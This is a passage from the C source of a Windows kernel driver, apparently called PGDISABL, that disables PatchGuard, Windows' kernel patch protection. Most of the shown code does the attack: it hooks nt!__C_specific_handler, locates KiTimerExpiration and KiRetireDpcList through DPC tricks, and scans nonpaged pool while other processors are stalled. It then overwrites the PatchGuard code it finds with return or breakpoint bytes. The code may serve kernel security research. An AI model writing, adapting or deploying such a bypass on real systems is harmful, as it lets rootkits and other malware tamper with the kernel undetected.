	else if (Major == 6 && (Minor == 0 || Minor == 1))
		PgOrig_C_specific_handler = PgOrig_C_specific_handler_Vista;
	else
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PgDisablePatchGuard(): Unsupported NTOS version.\n"));
		return STATUS_NOT_SUPPORTED;
	}

	PgFindNtos();

	//
	// mov rax, OFFSET PgCSpecificHandler
	// jmp rax
	//

	*(PULONGLONG)&Pg_C_specific_handler_hook[ 0x2 ] = (ULONGLONG)PgCSpecificHandler;

	RtlInitUnicodeString(
		&ProcedureName,
		L"__C_specific_handler");


	for (;;)
	{

#if PG_PATCHGUARD_VERSION == 3

		//
		// Version three requires some extra work up front.
		//

		Status = PgDisablePatchGuardVersion3Init();

		if (!NT_SUCCESS(Status))
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PgDisablePatchGuard(): Version three disablement initialization failed.\n"));
			return Status;
		}

#else
		//
		// Locate _C_specific_handler...
		//

		_C_specific_handler = MmGetSystemRoutineAddress(
			&ProcedureName);

		if (!_C_specific_handler)
		{
			Status = STATUS_PROCEDURE_NOT_FOUND;
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Failed to locate nt!_C_specific_handler - aborting.\n"));
			break;
		}

		//
		// Hook _C_specific_handler.
		//

		Status = PgHookCSpecificHandler(
			TRUE);

		if (!NT_SUCCESS(Status))
			break;

		//
		// All done...
		//

		Status = STATUS_SUCCESS;

		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Finished patching.  Restore pointer is %p, hookedroutine is %p.\n",
			Orig_C_specific_handlerRestorePointer,
			_C_specific_handler
			));
#endif

		if (PgBreakOnPatchGuard)
		{
			KdBreakPoint();
		}

		break;
	}

	return Status;
}

#if PG_ENABLE_DEVICE_OBJECT

#define IOCTL_PGDISABL_QUERY_COUNT \
    CTL_CODE( FILE_DEVICE_UNKNOWN, 0x01, METHOD_BUFFERED, FILE_ANY_ACCESS  )

NTSTATUS
PgDispatchDeviceControl(
	__in PDEVICE_OBJECT     DeviceObject,
	__in PIRP               Irp,
	__in PIO_STACK_LOCATION Stack
	)
{
	NTSTATUS Status;

	Status = STATUS_INVALID_DEVICE_REQUEST;

	switch (Stack->Parameters.DeviceIoControl.IoControlCode)
	{

	case IOCTL_PGDISABL_QUERY_COUNT:
		{
			if (Stack->Parameters.DeviceIoControl.OutputBufferLength != sizeof(ULONG))
			{
				Status = STATUS_INVALID_PARAMETER;
				break;
			}

			*(PULONG)Irp->AssociatedIrp.SystemBuffer = PgPatchGuardCount;

			Irp->IoStatus.Information = sizeof(ULONG);

			Status = STATUS_SUCCESS;
			break;
		}
		break;
	}

	return Status;
}

NTSTATUS
PgDispatch(
	__in PDEVICE_OBJECT DeviceObject,
	__in PIRP           Irp
	)
{
	PIO_STACK_LOCATION Stack;
	NTSTATUS           Status;

	Stack  = IoGetCurrentIrpStackLocation(
		Irp
		);
	Status = STATUS_SUCCESS;

	switch (Stack->MajorFunction)
	{

	case IRP_MJ_CREATE:
		Irp->IoStatus.Information = 0;
		break;

	case IRP_MJ_CLOSE:
		Irp->IoStatus.Information = 0;
		break;

	case IRP_MJ_DEVICE_CONTROL:
		Status = PgDispatchDeviceControl(
			DeviceObject,
			Irp,
			Stack
			);
		break;

	default:
		Status = STATUS_INVALID_DEVICE_REQUEST;

		Irp->IoStatus.Information = 0;
		break;

	}

	Irp->IoStatus.Status = Status;

	IoCompleteRequest(
		Irp,
		IO_NO_INCREMENT
		);

	return Status;
}

NTSTATUS
InitializeDeviceObject(
    __in PDRIVER_OBJECT  DriverObject,
    __in PUNICODE_STRING RegistryPath
    )
{
	NTSTATUS       Status;
	UNICODE_STRING DeviceName;
	UNICODE_STRING SymLinkName;
	PDEVICE_OBJECT DeviceObject;

	RtlInitUnicodeString(
		&DeviceName,
		L"\\Device\\pgdisabl"
		);

	RtlInitUnicodeString(
		&SymLinkName,
		L"\\DosDevices\\pgdisabl"
		);

	Status = IoCreateDevice(
		DriverObject,
		0,
		&DeviceName,
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE,
		&DeviceObject
		);

	if (!NT_SUCCESS(Status))
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "InitializeDeviceObject(): IoCreateDevice fails (%08X).\n",
			Status));
		return Status;
	}

	DriverObject->MajorFunction[ IRP_MJ_CREATE         ] = PgDispatch;
	DriverObject->MajorFunction[ IRP_MJ_CLOSE          ] = PgDispatch;
	DriverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL ] = PgDispatch;
	DriverObject->MajorFunction[ IRP_MJ_CLEANUP        ] = PgDispatch;

	DeviceObject->Flags |= DO_BUFFERED_IO;

	Status = IoCreateSymbolicLink(
		&SymLinkName,
		&DeviceName
		);

	if (!NT_SUCCESS(Status))
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "InitializeDeviceObject(): IoCreateSymbolicLink fails (%08X).\n",
			Status));

		IoDeleteDevice(
			DeviceObject
			);

		return Status;
	}

	return Status;
}

#endif

NTSTATUS
NTAPI
DriverEntry(
    __in PDRIVER_OBJECT  DriverObject,
    __in PUNICODE_STRING RegistryPath
    )
{
	//NTSTATUS Status = PgDisablePatchGuard();
	NTSTATUS Status;

	if (PgDisableDriver)
		return STATUS_UNSUCCESSFUL;

	if (PgBreakOnPatchGuard)
	{
		KdBreakPoint();
	}

	Status = PgDisablePatchGuardCSpecificHandler();

	if (!NT_SUCCESS(Status))
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Failed to disable PatchGuard (%x).\n",
			Status));
		return Status;
	}

#if PG_ENABLE_DEVICE_OBJECT
	Status = InitializeDeviceObject(
		DriverObject,
		RegistryPath
		);

	if (!NT_SUCCESS(Status))
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: InitializeDeviceObject() failed (%08X).\n",
			Status));
//		return Status;
	}
#endif

	DriverObject->DriverUnload = DriverUnload;

	return STATUS_SUCCESS;
}

VOID
NTAPI
DriverUnload(
	__in PDRIVER_OBJECT  DriverObject
	)
{
	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Unloading PGDISABL driver image.\n"));
}

PRUNTIME_FUNCTION
NTAPI
GetBaseRuntimeFunction(
	__in        PVOID VirtualAddress,
	__out       PULONG64 ImageBase,
	__inout_opt PUNWIND_HISTORY_TABLE HistoryTable OPTIONAL
	)
{
	PRUNTIME_FUNCTION FunctionEntry;
	PUNWIND_INFO      UnwindInfo;
	ULONG             Length;

	FunctionEntry = RtlLookupFunctionEntry(
		(ULONG64)VirtualAddress,
		ImageBase,
		HistoryTable
		);

	if (!FunctionEntry)
	{
//		wprintf(L"No function entry for %p\n", VirtualAddress);
		return 0;
	}

//	wprintf(L"Searching for %p...\n", VirtualAddress);

	for (;;)
	{
		//
		// If we're a direct chain then move to that link.
		//

//		wprintf(L"> %p - %p [%p ... %p]\n", FunctionEntry, FunctionEntry->UnwindData + *ImageBase, FunctionEntry->BeginAddress + *ImageBase, FunctionEntry->EndAddress + *ImageBase);

		if (FunctionEntry->UnwindData & 0x1)
		{
			FunctionEntry = (PRUNTIME_FUNCTION)(*ImageBase + (FunctionEntry->UnwindData & ~0x1));

//			wprintf(L"Direct chain\n");
			continue;
		}

		//
		// Process this entry.
		//

		UnwindInfo = (PUNWIND_INFO)(*ImageBase + FunctionEntry->UnwindData);

		if (UnwindInfo->Version != 1)
			return 0;

		//
		// Calculate the length of the unwind information block, up through the
		// unwind codes.
		//

		Length = 4 + (((UnwindInfo->CountOfCodes + 1) & ~1)) * 2;

		//
		// Check if there is a chained unwind off of the current entry.  If so,
		// then let's process it.
		//

		if (UnwindInfo->Flags & UNW_FLAG_CHAININFO)
		{
			FunctionEntry = (PRUNTIME_FUNCTION)(*ImageBase + FunctionEntry->UnwindData + Length);

//			wprintf(L"Post chain\n");
			continue;
		}
		else
		{
			//
			// All done.
			//

			break;
		}
	}

	return FunctionEntry;
}

BOOLEAN
AreFunctionsTheSame(
	__in        PVOID VirtualAddress1,
	__in        PVOID VirtualAddress2,
	__inout_opt PUNWIND_HISTORY_TABLE UnwindHistoryTable
	)
{
	ULONG64           ImageBase1;
	ULONG64           ImageBase2;
	PRUNTIME_FUNCTION RuntimeFunction1;
	PRUNTIME_FUNCTION RuntimeFunction2;

	RuntimeFunction1 = GetBaseRuntimeFunction(
		VirtualAddress1,
		&ImageBase1,
		0
		);

	RuntimeFunction2 = GetBaseRuntimeFunction(
		VirtualAddress2,
		&ImageBase2,
		UnwindHistoryTable
		);

	//
	// We cannot make a meaningful comparison on leaf functions.
	//

	if (!RuntimeFunction1 || !RuntimeFunction2)
		return FALSE;

	//
	// If the two chain up to the same PRUNTIME_FUNCTION then we'll assume a
	// match.
	//

	return (RuntimeFunction1 == RuntimeFunction2);
}

VOID
NTAPI
PgFindKiTimerExpirationDpc(
	IN struct _KDPC *Dpc,
	IN PVOID DeferredContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
	)
{
	PVOID   KiTimerExpirationMiddle = _ReturnAddress();
	ULONG64 Base;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgFindKiTimerExpirationDpc(): KiTimerExpirationMiddle = %p\n",
		KiTimerExpirationMiddle));

	//
	// Determine the root PRUNTIME_FUNCTION for KiTimerExpiration.  This gets
	// us the start of the function if we need it.
	//

	PgKiTimerExpirationInfo = GetBaseRuntimeFunction(
		KiTimerExpirationMiddle,
		&Base,
		0
		);

	//
	// Let's double check that KiTimerExpiration is really within the confines
	// of nt.  If not then something is rather broken.
	//

	if (PgKiTimerExpirationInfo)
	{
		if (Base != NtosBase)
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgFindKiTimerExpirationDpc(): KiTimerExpiration is not within NTOS?\n"));

			PgKiTimerExpirationInfo = 0;
		}
	}
	else
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgFindKiTimerExpirationDpc(): KiTimerExpiration has no PRUNTIME_FUNCTION!\n"));
	}

	//
	// Save away the idle process.
	//

	IdleSystemProcess = PsGetCurrentProcess();

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgFindKiTimerExpirationDpc(): IdleSystemProcess = %p\n",
		IdleSystemProcess));

	//
	// We set DeferredContext to be the PKEVENT to signal completion.
	//

	KeSetEvent(
		(PKEVENT)DeferredContext,
		0,
		FALSE);
}

VOID
NTAPI
PgFindKiRetireDpcListDpc(
	IN struct _KDPC *Dpc,
	IN PVOID DeferredContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
	)
{
	PVOID   KiRetireDpcListMiddle = _ReturnAddress();
	ULONG64 Base;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgFindKiRetireDpcListDpc(): KiRetireDpcListMiddle = %p\n",
		KiRetireDpcListMiddle));

	//
	// Determine the root PRUNTIME_FUNCTION for KiRetireDpcList.  This gets
	// us the start of the function if we need it.
	//

	PgKiRetireDpcListInfo = GetBaseRuntimeFunction(
		KiRetireDpcListMiddle,
		&Base,
		0
		);

	//
	// Let's double check that KiRetireDpcList is really within the confines
	// of nt.  If not then something is rather broken.
	//

	if (PgKiRetireDpcListInfo)
	{
		if (Base != NtosBase)
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgFindKiRetireDpcListDpc(): KiRetireDpcList is not within NTOS?\n"));

			PgKiRetireDpcListInfo = 0;
		}
	}
	else
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgFindKiRetireDpcListDpc(): KiRetireDpcList has no PRUNTIME_FUNCTION!\n"));
	}

	//
	// We set DeferredContext to be the PKEVENT to signal completion.
	//

	KeSetEvent(
		(PKEVENT)DeferredContext,
		0,
		FALSE);
}


NTSTATUS
PgLocateKiTimerExpiration(
	VOID
	)
{
	LARGE_INTEGER DueTime;
	NTSTATUS      Status;
	KEVENT        FindDpcCallerEvent;
	KDPC          FindDpcCallerDpc;

	//
	// Initialize DPC, Timer, and Event objects that we'll use to locate the
	// DPC caller (actually DPC return address, but close enough).
	//

	KeInitializeEvent(
		&FindDpcCallerEvent,
		NotificationEvent,
		FALSE);
	KeInitializeDpc(
		&FindDpcCallerDpc,
		PgFindKiTimerExpirationDpc,
		&FindDpcCallerEvent);
	KeInitializeTimer(&FindDpcCallerTimer);

	//
	// Set the timer up.  We'll want it to run immediately so we'll set the
	// interval as one relative 100-ns interval.
	//
	
	DueTime.QuadPart = -10000 * 1000;

	KeSetTimer(
		&FindDpcCallerTimer,
		DueTime,
		&FindDpcCallerDpc);

	//
	// Wait for the completion event that signals that we're in the DPC.
	//

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgLocateKiTimerExpiration(): Waiting on DPC to perform stack trace (Timer = %p, DPC = %p)...\n",
		&FindDpcCallerTimer,
		&FindDpcCallerDpc));

	KeWaitForSingleObject(
		&FindDpcCallerEvent,
		Executive,
		KernelMode,
		FALSE,
		0);

	//
	// Okay, now we need to wait for the DPC queue to drain, so that we're sure
	// that the DPC routine has returned.  Otherwise, there's a race condition
	// on multi-processor systems, where this processor might clean up the DPC
	// while the DPC routine was still running on a different processor, right
	// after it called KeSetEvent.
	//

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgLocateKiTimerExpiration(): Waiting for DPC queue to be flushed...\n"));
	KeFlushQueuedDpcs();

	//
	// Now, we should have the return address for all DPC callers.  This shall
	// enable us to identify the faulting DPCs.  This is important as in
	// version three, the logic for the general protection fault handler has
	// been altered such that the exception address is now a bogus value and
	// not a predictable -1 for non-canonical address dereferences.  We'll make
	// the assumption that no legitimate DPC will be throwing exceptions like
	// that.
	//

	if (PgKiTimerExpirationInfo == 0)
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgLocateKiTimerExpiration(): Failed to locate KiTimerExpiration?\n"));
		return STATUS_UNSUCCESSFUL;
	}

	PgKiTimerExpiration = (PVOID)(NtosBase + PgKiTimerExpirationInfo->BeginAddress);

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgLocateKiTimerExpiration(): PgKiTimerExpiration = %p, PgKiTimerExpirationInfo = %p\n",
		PgKiTimerExpiration,
		PgKiTimerExpirationInfo));

//	if (IdleSystemProcess == InitialSystemProcess)
//	{
//		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgLocateKiTimerExpiration(): Failed to locate idle system process!\n"));
//		return STATUS_NOT_FOUND;
//	}

	//
	// Locate the non-timer DPC dispatcher now.
	//

	KeClearEvent(
		&FindDpcCallerEvent
		);

	KeInitializeDpc(
		&FindDpcCallerDpc,
		PgFindKiRetireDpcListDpc,
		&FindDpcCallerEvent);

	KeInsertQueueDpc(
		&FindDpcCallerDpc,
		0,
		0
		);

	//
	// Wait for the completion event that signals that we're in the DPC.
	//

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgLocateKiTimerExpiration(): Waiting on DPC to perform stack trace (Timer = %p, DPC = %p)...\n",
		&FindDpcCallerTimer,
		&FindDpcCallerDpc));

	KeWaitForSingleObject(
		&FindDpcCallerEvent,
		Executive,
		KernelMode,
		FALSE,
		0);

	//
	// Okay, now we need to wait for the DPC queue to drain, so that we're sure
	// that the DPC routine has returned.  Otherwise, there's a race condition
	// on multi-processor systems, where this processor might clean up the DPC
	// while the DPC routine was still running on a different processor, right
	// after it called KeSetEvent.
	//

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgLocateKiTimerExpiration(): Waiting for DPC queue to be flushed...\n"));
	KeFlushQueuedDpcs();

	if (PgKiRetireDpcListInfo == 0)
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgLocateKiTimerExpiration(): Failed to locate KiRetireDpcList?\n"));
		return STATUS_UNSUCCESSFUL;
	}

	PgKiRetireDpcList = (PVOID)(NtosBase + PgKiRetireDpcListInfo->BeginAddress);

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgLocateKiTimerExpiration(): PgKiRetireDpcList = %p, PgKiRetireDpcListInfo = %p\n",
		PgKiRetireDpcList,
		PgKiRetireDpcListInfo));

	return STATUS_SUCCESS;
}

ULONG_PTR
SearchPoolStallProcessors(
	IN ULONG_PTR Argument
	)
{
	PIPI_CALL_PACKET Packet;
	PUCHAR           Search;
	KIRQL            Irql;

	Packet = (PIPI_CALL_PACKET)Argument;

	//
	// Raise to HIGH_LEVEL so that we shall not service hardware interrupts.
	// The IPI call shall take care of suspending all processors except the
	// desired processor.  This is essentially taking the "sledgehammer
	// approach" to synchronization as we don't have the capability to use the
	// Mm synchronization required to call MmIsAddressValid safely otherwise.
	//

	KeRaiseIrql(
		HIGH_LEVEL,
		&Irql
		);

	//
	// If we're the desired processor then perform the operation.
	//

	if (KeGetCurrentProcessorNumber() == Packet->ProcessorNumber)
	{
		//
		// Scan pool now.
		//

		Search = (PUCHAR)Packet->PoolAddress;

		for (;;)
		{
			if (Packet->ScanForward)
				Search += 1;
			else
				Search -= 1;

			//
			// We must be able to make the comparison...
			//

			if (!MmIsAddressValid(Search))
				break;

			if (!MmIsAddressValid(Search + 8))
				break;

			if (*(PULONG64)Search == Packet->Key)
				Packet->Code = Search;
		}

		//
		// Mark us as finished.
		//

		Packet->Finished = 1;
	}
	else
	{
		//
		// Otherwise, spin while we're not finished.
		//

		while (!Packet->Finished)
			KeStallExecutionProcessor( 50 );
	}

	//
	// Drop IRQL back to IPI_LEVEL.
	//

	KeLowerIrql(
		Irql
		);

	return 0;
}

PUCHAR
SearchNonPagedPool(
	__in BOOLEAN ScanForward,
	__in PVOID   PoolAddress,
	__in ULONG64 Key
	)
{
	IPI_CALL_PACKET  Packet;

	//
	// Initialized the packet with the required information.  Note that we
	// pick any processor number and don't bother to set the affinity.  This
	// is okay as we just want exactly one (but any) processor to run the
	// search while the rest of the system is suspended.
	//

	Packet.PoolAddress     = PoolAddress;
	Packet.Key             = Key;
	Packet.ProcessorNumber = KeGetCurrentProcessorNumber();
	Packet.ScanForward     = ScanForward;
	Packet.Code            = 0;
	Packet.Finished        = 0;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: SearchNonPagedPool(): Scanning %s from %p for %p...\n",
		ScanForward ? "forward" : "backward",
		PoolAddress,
		Key));

	//
	// Make the Ipi call now.
	//

	(VOID) KeIpiGenericCall(
		SearchPoolStallProcessors,
		(ULONG_PTR)&Packet
		);

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: SearchNonPagedPool(): Search result = %p\n",
		Packet.Code));

	//
	// Return the results.
	//

	return Packet.Code;
}

NTSTATUS
PgDisableKiTimerDispatch(
	VOID
	)
{
	ULONG64 Key = 0x24448b20ec83489c; /* 0x113148f000c7108b */
	PVOID   PoolAddress;
	PUCHAR  Code;

	//
	// Find an address in the nonpaged pool.
	//

	PoolAddress = ExAllocatePoolWithTag(
		NonPagedPool,
		1,
		'iDgP'
		);

	if (!PoolAddress)
		return STATUS_NO_MEMORY;

	//
	// Let's search forwards and backwards for the key.
	//
	// N.B. Race condition by splitting this as we should really have
	// done it all in one call, in case the allocation gets moved before and
	// after across one search call but before the next.
	//

	do
	{
		Code = SearchNonPagedPool(
			FALSE,
			PoolAddress,
			Key
			);

		if (!Code)
		{
			Code = SearchNonPagedPool(
				TRUE,
				PoolAddress,
				Key
				);
		}

		//
		// If we've got a hit then we'll disable it.
		//

		if (Code)
		{
			if (PgBreakOnPatchGuard)
			{
				Code[ 0 ] = 0xCC;
				Code[ 1 ] = 0xC3;

				KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgDisableKiTimerDispatch(): Located and disabled KiTimerDispatch at %p\n",
					Code));

				KdBreakPoint();
			}
			else
			{
				Code[ 0 ] = 0xC3;
			}

			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgDisableKiTimerDispatch(): KiTimerDispatch = %p\n",
				Code));

			PgPatchGuardCount += 1;
		}
	} while (Code) ;

	ExFreePoolWithTag(
		PoolAddress,
		'iDgP'
		);

	return STATUS_SUCCESS;
}

NTSTATUS
PgDisablePatchGuardCSpecificHandler(
	VOID
	)
{
	UNICODE_STRING ProcedureName;
	NTSTATUS       Status;
	ULONG          Major;
	ULONG          Minor;

	//
	// Determine NT version.
	//

	PsGetVersion(
		&Major,
		&Minor,
		0,
		0);

	NtMajorVersion = Major;
	NtMinorVersion = Minor;

	if (Major == 5 && Minor == 2)
		PgOrig_C_specific_handler = PgOrig_C_specific_handler_Srv03;
	else if (Major == 6 && (Minor == 0 || Minor == 1))
		PgOrig_C_specific_handler = PgOrig_C_specific_handler_Vista;
	else
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgDisablePatchGuardCSpecificHandler(): Unsupported NTOS version.\n"));
		return STATUS_NOT_SUPPORTED;
	}

	//
	// Find NT base.
	//

	PgFindNtos();

	//
	// Save away the initial system process address.
	//

	InitialSystemProcess = PsGetCurrentProcess();

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgDisablePatchGuardCSpecificHandler(): InitialSystemProcess = %p\n",
		InitialSystemProcess));

	//
	// mov rax, OFFSET PgCSpecificHandler
	// jmp rax
	//

	*(PULONGLONG)&Pg_C_specific_handler_hook[ 0x2 ] = (ULONGLONG)PgCSpecificHandler;

	RtlInitUnicodeString(
		&ProcedureName,
		L"__C_specific_handler");


	for (;;)
	{
		//
		// Determine DPC / Idle Process info.
		//

		Status = PgLocateKiTimerExpiration();

		if (!NT_SUCCESS(Status))
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgDisablePatchGuardCSpecificHandler(): PgLocateKiTimerExpiration fails, %08X\n",
				Status));
			break;
		}

		//
		// Locate and disable KiTimerExpiration if we can.  It may not be
		// present as not all permutations lead to it.
		//

		Status = PgDisableKiTimerDispatch();

		if (!NT_SUCCESS(Status))
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgDisablePatchGuardCSpecificHandler(): PgDisableKiTimerDispatch fails, %08X\n",
				Status));
			break;
		}

		//
		// Locate _C_specific_handler...
		//

		_C_specific_handler = MmGetSystemRoutineAddress(
			&ProcedureName);

		if (!_C_specific_handler)
		{
			Status = STATUS_PROCEDURE_NOT_FOUND;
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgDisablePatchGuardCSpecificHandler(): Failed to locate nt!_C_specific_handler - aborting.\n"));
			break;
		}

		//
		// Hook _C_specific_handler.
		//

		Status = PgHookCSpecificHandler(
			TRUE);

		if (!NT_SUCCESS(Status))
			break;

		//
		// All done...
		//

		Status = STATUS_SUCCESS;

		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgDisablePatchGuardCSpecificHandler(): Finished patching.  Restore pointer is %p, hookedroutine is %p.\n",
			Orig_C_specific_handlerRestorePointer,
			_C_specific_handler
			));

		if (PgBreakOnPatchGuard)
		{
			KdBreakPoint();
		}

		break;
	}

	return Status;
}
